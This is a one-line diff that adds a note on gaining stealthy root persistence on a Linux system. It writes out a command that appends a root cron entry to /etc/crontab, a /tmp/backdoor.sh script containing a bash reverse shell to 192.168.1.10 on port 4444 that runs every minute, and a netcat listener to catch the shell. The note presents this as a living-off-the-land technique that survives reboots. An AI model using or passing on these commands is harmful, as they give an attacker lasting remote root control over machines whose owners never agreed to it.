@@ -1,0 +1,1 @@
+Created stealthy cron job: echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab where backdoor.sh contains bash -i >& /dev/tcp/192.168.1.10/4444 0>&1. Executes every minute as root, survives reboots. Listener: nc -lvnp 4444. LoL technique - no new binaries dropped
